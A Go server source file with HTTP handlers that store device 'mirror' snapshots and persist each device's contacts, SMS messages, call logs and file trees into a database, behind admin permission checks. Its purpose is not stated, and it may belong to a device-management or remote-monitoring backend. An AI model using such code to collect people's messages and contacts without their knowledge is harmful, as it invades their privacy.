package api

import (
	"context"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

type mirrorStore struct {
	mu    sync.RWMutex
	items map[string]json.RawMessage
}

func newMirrorStore() *mirrorStore {
	return &mirrorStore{items: make(map[string]json.RawMessage)}
}

func mirrorStorageKey(deviceID uuid.UUID, mirrorType string) string {
	return deviceID.String() + ":" + mirrorType
}

func (m *mirrorStore) get(deviceID uuid.UUID, mirrorType string) (json.RawMessage, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	raw, ok := m.items[mirrorStorageKey(deviceID, mirrorType)]
	return raw, ok
}

func (m *mirrorStore) set(deviceID uuid.UUID, mirrorType string, snapshot json.RawMessage) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.items[mirrorStorageKey(deviceID, mirrorType)] = snapshot
}

func (s *Server) handleGetMirror(w http.ResponseWriter, r *http.Request) {
	admin := getAdmin(r.Context())
	if !s.permissionChecker.HasPermission(admin, "device:command") &&
		!s.permissionChecker.HasPermission(admin, "file:list") {
		s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Insufficient permissions")
		return
	}

	vars := mux.Vars(r)
	deviceID, err := uuid.Parse(vars["device_id"])
	if err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_ID", "Invalid device ID")
		return
	}

	mirrorType := r.URL.Query().Get("type")
	if mirrorType == "" {
		s.writeError(w, http.StatusBadRequest, "INVALID_REQUEST", "Query parameter type is required")
		return
	}

	if raw, ok := s.mirrors.get(deviceID, mirrorType); ok {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write(raw)
		return
	}

	s.writeJSON(w, http.StatusOK, map[string]interface{}{
		"type":       mirrorType,
		"updated_at": nil,
		"items":      []interface{}{},
		"entries":    []interface{}{},
		"roots":      []interface{}{},
		"source":     "server",
	})
}

func (s *Server) handleMirrorUpdate(w http.ResponseWriter, r *http.Request) {
	admin := getAdmin(r.Context())
	if !s.permissionChecker.HasPermission(admin, "device:command") {
		s.writeError(w, http.StatusForbidden, "FORBIDDEN", "Insufficient permissions")
		return
	}

	vars := mux.Vars(r)
	deviceID, err := uuid.Parse(vars["device_id"])
	if err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_ID", "Invalid device ID")
		return
	}

	var req struct {
		Types     []string                     `json:"types"`
		Snapshots map[string]json.RawMessage   `json:"snapshots"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeError(w, http.StatusBadRequest, "INVALID_REQUEST", "Invalid request body")
		return
	}

	now := time.Now().UTC().Format(time.RFC3339)
	out := make(map[string]json.RawMessage)

	for mirrorType, raw := range req.Snapshots {
		if len(raw) == 0 {
			continue
		}
		var obj map[string]interface{}
		if err := json.Unmarshal(raw, &obj); err == nil {
			if _, ok := obj["updated_at"]; !ok {
				obj["updated_at"] = now
			}
			if _, ok := obj["type"]; !ok {
				obj["type"] = mirrorType
			}
			if patched, err := json.Marshal(obj); err == nil {
				raw = patched
			}
		}
		s.mirrors.set(deviceID, mirrorType, raw)
		out[mirrorType] = raw
		s.persistMirrorSnapshot(deviceID, mirrorType, raw)
	}

	for _, mirrorType := range req.Types {
		if _, written := out[mirrorType]; written {
			continue
		}
		if existing, ok := s.mirrors.get(deviceID, mirrorType); ok {
			out[mirrorType] = existing
		}
	}

	resp := map[string]interface{}{
		"status":     "ok",
		"updated_at": now,
	}
	for k, v := range out {
		var decoded interface{}
		if err := json.Unmarshal(v, &decoded); err == nil {
			resp[k] = decoded
		}
	}

	s.writeJSON(w, http.StatusOK, resp)
}

// persistMirrorSnapshot best-effort writes contacts/SMS/call mirrors into Postgres.
func (s *Server) persistMirrorSnapshot(deviceID uuid.UUID, mirrorType string, raw json.RawMessage) {
	if s.db == nil || len(raw) == 0 {
		return
	}
	var snap map[string]interface{}
	if err := json.Unmarshal(raw, &snap); err != nil {
		return
	}
	items := extractMirrorItems(snap)
	if len(items) == 0 {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()

	switch mirrorType {
	case "contacts":
		if err := s.sealContactMaps(deviceID, items); err != nil {
			log.Printf("encrypt contacts mirror for %s: %v", deviceID, err)
			return
		}
		if _, err := s.db.UpsertDeviceContacts(ctx, deviceID, items); err != nil {
			log.Printf("persist contacts mirror for %s: %v", deviceID, err)
		}
	case "sms_inbox", "sms_sent", "sms":
		if err := s.sealSMSMaps(deviceID, items); err != nil {
			log.Printf("encrypt sms mirror for %s: %v", deviceID, err)
			return
		}
		if _, err := s.db.UpsertDeviceSMS(ctx, deviceID, items); err != nil {
			log.Printf("persist sms mirror for %s: %v", deviceID, err)
		}
	case "call_logs", "calls":
		if err := s.sealCallMaps(deviceID, items); err != nil {
			log.Printf("encrypt call logs mirror for %s: %v", deviceID, err)
			return
		}
		if _, err := s.db.UpsertDeviceCallLogs(ctx, deviceID, items); err != nil {
			log.Printf("persist call logs mirror for %s: %v", deviceID, err)
		}
	case "file_tree":
		// Prefer flat entries/items; some mirrors nest under roots.
		fileItems := items
		if len(fileItems) == 0 {
			fileItems = extractMirrorItems(snap)
		}
		if roots, ok := snap["roots"].([]interface{}); ok {
			for _, r := range roots {
				if m, ok := r.(map[string]interface{}); ok {
					fileItems = append(fileItems, m)
				}
			}
		}
		if entries, ok := snap["entries"].([]interface{}); ok {
			for _, e := range entries {
				if m, ok := e.(map[string]interface{}); ok {
					fileItems = append(fileItems, m)
				}
			}
		}
		if len(fileItems) > 0 {
			if err := s.sealFileMaps(deviceID, fileItems); err != nil {
				log.Printf("encrypt file_tree mirror for %s: %v", deviceID, err)
				return
			}
			if _, err := s.db.UpsertDeviceFileEntries(ctx, deviceID, fileItems); err != nil {
				log.Printf("persist file_tree mirror for %s: %v", deviceID, err)
			}
		}
	}
}

func extractMirrorItems(snap map[string]interface{}) []map[string]interface{} {
	candidates := []string{"items", "contacts", "messages", "calls", "entries"}
	var rawList []interface{}
	for _, key := range candidates {
		if v, ok := snap[key].([]interface{}); ok && len(v) > 0 {
			rawList = v
			break
		}
	}
	if rawList == nil {
		return nil
	}
	out := make([]map[string]interface{}, 0, len(rawList))
	for _, item := range rawList {
		if m, ok := item.(map[string]interface{}); ok {
			out = append(out, m)
		}
	}
	return out
}
